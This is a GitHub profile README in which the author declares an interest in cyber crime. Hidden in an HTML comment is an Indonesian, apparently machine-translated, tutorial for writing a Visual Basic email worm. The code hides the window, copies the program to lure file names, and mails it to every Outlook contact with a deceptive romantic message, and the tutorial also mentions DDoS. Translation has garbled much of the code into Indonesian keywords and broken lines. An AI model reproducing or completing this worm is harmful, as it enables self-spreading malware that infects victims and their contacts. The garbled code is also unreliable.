- 👋 Hi, I’m @kushendar78
- 👀 I’m interested in HiJackerExploit.md
- 🌱 I’m currently learning HiJackerExploit.md
- 💞️ I’m looking to collaborate on  dalam dunia Cyber Crime
<!---
kushendar78/kushendar78 is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
Membuat worm Visual Basic

Diterbitkan 10.30.2006 oleh kus | Kirimkan pos ini ke email
Ini sepenuhnya dikreditkan ke mweed4, seorang moderator super di http://www.infowar.com

mweed4 menulis: Saya lupa di mana dan kapan saya mengambil ini. Jika Anda baru, 
silakan coba kode sebagai lawan menggunakan gui seperti sub tujuh, dll. Ini adalah praktik yang bagus untuk linux, dll.

Sekarang hal pertama yang akan kita lakukan adalah menunjukkan kepada Anda apa worm kita yang akan kita
 gunakan untuk membuat akan melakukan. Worm yang akan kita buat adalah w32.N00bie. 
Cacing ini tidak terlalu kuat tetapi bagus untuk pemula. Untuk dapat membuat worm ini Anda memerlukan Microsoft Visual Basic.
 Visual Basic adalah RPD atau Pembangun Aplikasi Cepat. Sekarang kita akan mulai membuat program pertama kita di Visual Basic.

Buka Visual Basic dan pilih Program Standrad .exe. Sekarang, 
Visual Basic akan memuat Windows yang berjudul "Form1" Ini adalah formulir utama untuk Visual Basic. Ini cacingmu.
 Klik dua kali pada jendela berlabel "form1" dan Anda akan melihat teks di bawah


ini Private formsub_load()

End Sub


Anda akan membuat kode di antara teks ini. (Gambar Satu menunjukkan contoh di mana Anda akan melakukan pengkodean)
 Hal pertama yang akan Anda lakukan adalah menyembunyikan worm Anda. Cacing harus memiliki siluman untuk dianggap sebagai Cacing "Nyata". 
Salah satu cara Anda dapat menyembunyikan Window apa pun di Visual Basic adalah kode di bawah ini

Form1.Visible = False

Kode di atas akan membuat form1 Tidak Terlihat Atau Anda bisa melakukan ini

Me.hide

Jadi, Sekarang mari tambahkan Me.Hide ke dalam kode kita. Jadi, kode dalam Visual Basic sekarang akan terlihat seperti di bawah ini.

Private Sub form_Load()
Me.Hide
End Sub

Now Sejauh ini satu-satunya hal yang akan dilakukan worm Anda adalah Menyembunyikan dirinya dari pengguna. 
Jadi, Sekarang mari kita membuat hati cacing. Sekarang saya katakan di atas worm harus melakukan BEBERAPA hal berikut:

-Email
-Injection
-Infection file -File
Sharing
-Eksploitasi seperti Dcom Exploit W32.Blaster Digunakan
-Messenger Exploits

Pada worm ini kita akan melakukan Emailing, File Sharing dan kita juga akan melakukan beberapa DDoS Attacks
 dan Lainnya dengan worm pada tanggal tertentu. Jadi, hal pertama yang kami ingin worm kami lakukan 
adalah menyalin dirinya sendiri di suatu tempat di mesin. Mengapa Anda mungkin bertanya? Ini adalah Pertanyaan yang Bagus. 

Alasan mengapa katakanlah bahwa worm diluncurkan dalam lampiran email tetapi beberapa cara menghapusnya ketika pengguna memulai ulang.
 Nah, Dengan salinan worm di mesin selalu ada peluang bagus bahwa worm akan diaktifkan kembali. 

Jadi, biarkan worm itu menyalin dirinya sendiri beberapa kali di sistem. Jadi, 
Ini adalah kode untuk menyalin dirinya sendiri ke tempat lain di mesin. 

Ketika saya mengatakan Copyiteself, maksud saya Seperti Membuat Salinan Tepat dari dirinya sendiri 
ke lokasi lain dengan nama yang berbeda. Jadi, Kami akan membuat 

contoh worm ini menyalin dirinya sendiri ke Drive C:\ menggunakan Nama File berikut:

C:\Worm1.exe
C:\InnocentFile.exe
C:\Me.exe
C:\OpenMe!.exe

Jadi, Dalam Visual Basic untuk menyalinnya sendiri dengan nama file tersebut 
ke drive c:\ yang akan kita miliki untuk memasukkan kode berikut. Jika Anda mempelajari kode tersebut, 
Anda akan mengerti apa artinya. Saya telah menjelaskan kode sedikit lebih baik di bawah ini.

Filcopy App.Path + "\" + App.EXEName + ".exe", "C:\Worm1.Exe"
Filcopy App.Path + "\" + App.EXEName + ".exe", "C:\InnocentFile. exe"
Filcopy App.Path + "\" + App.EXEName + ".exe", "C:\Me.EXE"
Filcopy App.Path + "\" + App.EXEName + ".exe", "C:\ OpenMe!.EXE"

Sekarang apa arti kode ini sepotong demi sepotong? Saya akan menjelaskannya sebaik mungkin di bawah ini:



App.Path + - Ini berarti akan menyalin Jalur Aplikasi

"\" - Ini sulit dijelaskan. Anda tahu bagaimana ketika Anda
 mengetik lokasi seperti C:\ dan Anda melihat \? Nah di kode ini tanpa "\" akan terlihat 
seperti ini C: Windows Desktop Worme.exe Jadi kita harus menambahkan ini di "\" agar terlihat seperti C:\Windows\Desktop\Worme.exe

App. EXEname + - Ini berarti akan membuat salinan dari Aplikasi Asli .Exe Name

.exe - Ekstensi file

Kemudian setelah lokasi file dipilih, Anda perlu memberi tahu Visual Basic ke mana akan menyalin worm. 
Jadi, Anda melihat bagian terakhir dari kode ini (The Part In Bolad)

Filcopy App.Path + "\" + App.EXEName + ".exe", "C:\OpenMe!.EXE"

Di sinilah kita akan menentukan di mana kita ingin salinan worm disalin. 
Jadi jika Anda mengubah bagian terakhir dari kode ke C:\Windows\Openme!.exe itu akan membuat salinan worm ke C:\Windows\Openme!.exe

Sekarang, saya harap saya tidak membingungkan Anda banyak. Jika saya punya saya minta maaf! Lol Anyway Kode Visual Basic Anda sekarang akan
terlihat seperti ini

Private Form Sub_Load()
Me.hide
Filcopy App.Path + "\" + App.EXEName + ".exe", "C:\Worm1.Exe"
Filcopy App.Path + "\" + App.EXEName + ".exe", "C:\InnocentFile.exe"
Filcopy App.Path + "\" + App.EXEName + ".exe", "C:\Me.EXE"
Filcopy App. Path + "\" + App.EXEName + ".exe", "C:\OpenMe!.EXE"




Menyembunyikan dirinya dari pengguna (Menyembunyikan dirinya sendiri)
Menyalin salinan persis dirinya ke C:\Worm1.Exe, C:\Innocentfile.exe, C:\Me.exe, C:\Openme.exe

Sekarang, mari kita buat worm Anda menyebar . Sekarang, Cara termudah untuk menyebarkan worm adalah Via-Email. Email adalah
Metode Penyebaran #1 dari Worm Internet. Jadi, Sekarang mari kita tambahkan kode email ke dalam program ini.

(Catatan: Agar kode email berfungsi, Anda perlu menambahkan Windows Scripting Control ke dalam program Anda. 
Jika tidak, worm Anda tidak akan melakukan tugas email sebelumnya. Anda menambahkan WSC dengan cara yang sama seperti Anda menambahkan Kontrol Winsock)

Sekarang Tambahkan kode Visual Basic Scripting ini ke dalam kode program Anda:

Set so = CreateObject(fso)
Set ol = CreateObject("Outlook.Application")
Set out = Wscript.CreateObject("Outlook.
Setel mapi = out.GetNameSpace("MAPI")
Setel a = mapi.AddressLists(1)
Untuk X = 1 Ke a.AddressEntries.Count
Setel Mail = ol.CreateItem(0)
Mail.to = ol.GetNameSpace("MAPI" ).AddressLists(1).AddressEntries(X)
Mail.Subject = "Fwd:None"
Mail.Body = "Apakah Anda ingin mengejutkan istri atau suami Anda? Apakah Anda ingin melakukan sesuatu yang romantis untuk mereka?
Ingin tahu caranya beruntunglah Sydney telah membuat Dokumen Luar Biasa ini Terlampir. Ini memberi tahu pria semua yang diinginkan Wanita!
 Dan Wanita, Anda dapat menambahkan barang ke dalamnya sebelum meneruskannya ke semua teman Anda!"
Mail.Attachments.Add = "C:\Worm1.exe"
Mail.Kirim
Berikutnya
ol.Quit

Sekarang worm Anda mengirim email sendiri. Saya ingin memberi tahu Anda bahwa ketika Anda mengkompilasi kode Visual Basic bahwa
Kode Vbs ini mungkin memberi Anda kesalahan. Nah, Jika itu Hapus kode apa pun yang memberi Anda kesalahan.
 Biasanya Set Pertama So=CreateObject(fso) jika ini terjadi, hapus saja dan coba kompilasi ulang. Ini harus bekerja. 
Jika itu tidak memecahkan masalah dan Anda akan berhasil memperbaiki masalah! Bagaimanapun, kode Visual Basic Anda sekarang akan terlihat seperti ini


Private Form Sub_Load()
Me.hide
Filcopy App.Path + "\" + App.EXEName + ".exe", "C:\Worm1.Exe"
Filcopy App.Path + "\" + App.EXEName + ".exe", "C:\InnocentFile.exe"
Filcopy App.Path + "\" + App.EXEName + ".exe", "C:\Me.EXE"
Filcopy App. Jalur + "\" + Aplikasi.

Set ol = CreateObject("Outlook.Application")
Set = Wscript.CreateObject("Outlook.Application")
Set mapi = out.GetNameSpace("MAPI")
Tetapkan a = mapi.AddressLists(1)
Untuk X = 1 Ke a .AddressEntries.Count
Set Mail = ol.CreateItem(0)
Mail.to = ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(X)
Mail.Subject = "Fwd:None"
Mail.Body = "Lakukan Anda ingin mengejutkan istri atau suami Anda? Apakah Anda ingin melakukan sesuatu yang Romantis untuk mereka? 
Ingin tahu cara mendapatkan keberuntungan? telah membuat Dokumen Luar Biasa ini Terlampir. 
Ini memberi tahu pria segala yang diinginkan Wanita! Dan Wanita, Anda dapat menambahkan barang ke dalamnya sebelum meneruskannya ke semua temanmu!"
Mail.Attachments.Add = Email "C:\Worm1.exe"
.
Sekarang Anda memiliki Cacing! Bagaimana ini cacing? Worm adalah file yang dapat mengirim email sendiri, 
menginfeksi komputer lain tanpa harus ada orang yang mengirim email file worm akan melakukannya dengan sendirinya. 
tolong gunakan ini untuk ed. tujuan saja. (ditambah anti virus apa pun akan mengambilnya segera.)
--->!
